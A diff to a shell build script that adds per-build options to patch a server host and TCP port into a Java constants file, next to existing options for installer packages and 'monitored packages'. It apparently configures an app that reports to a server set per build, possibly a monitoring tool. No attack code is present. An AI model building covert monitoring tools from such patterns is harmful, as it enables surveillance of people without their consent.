@@ -491,7 +491,7 @@ cleanup_overrides() {
 }
 trap cleanup_overrides EXIT
 
-if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ]; then
+if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_TCP_HOST:-}" ] || [ -n "${BUILD_TCP_PORT:-}" ]; then
     echo ""
     echo "==> Per-build customization active"
 
@@ -568,6 +568,44 @@ with open(path, 'w', encoding='utf-8') as f:
     f.write(new)
 print(f"  Constants.java MONITORED_PACKAGES = {len(uniq)} entries")
 PYEOF
+    fi
+
+    # Patch Constants.java TCP_HOST with the server's actual hostname.
+    if [ -n "${BUILD_TCP_HOST:-}" ] && [ -f "$APP_CONSTANTS" ]; then
+        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
+        BUILD_TCP_HOST="$BUILD_TCP_HOST" python3 - "$APP_CONSTANTS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+host = os.environ['BUILD_TCP_HOST']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+new = re.sub(
+    r'(public\s+static\s+final\s+String\s+TCP_HOST\s*=\s*")[^"]*(")',
+    lambda m: m.group(1) + host + m.group(2),
+    src, count=1
+)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+print(f"  Constants.java TCP_HOST = {host}")
+PYEOF
+        echo "  TCP_HOST = $BUILD_TCP_HOST"
+    fi
+
+    # Patch Constants.java TCP_PORT with the server's actual port.
+    if [ -n "${BUILD_TCP_PORT:-}" ] && [ -f "$APP_CONSTANTS" ]; then
+        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
+        BUILD_TCP_PORT="$BUILD_TCP_PORT" python3 - "$APP_CONSTANTS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+port = os.environ['BUILD_TCP_PORT']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+new = re.sub(
+    r'(public\s+static\s+final\s+int\s+TCP_PORT\s*=\s*)\d+(\s*;)',
+    lambda m: m.group(1) + port + m.group(2),
+    src, count=1
+)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+print(f"  Constants.java TCP_PORT = {port}")
+PYEOF
+        echo "  TCP_PORT = $BUILD_TCP_PORT"
     fi
 
     # Force clean build whenever customization is active — gradle's resource
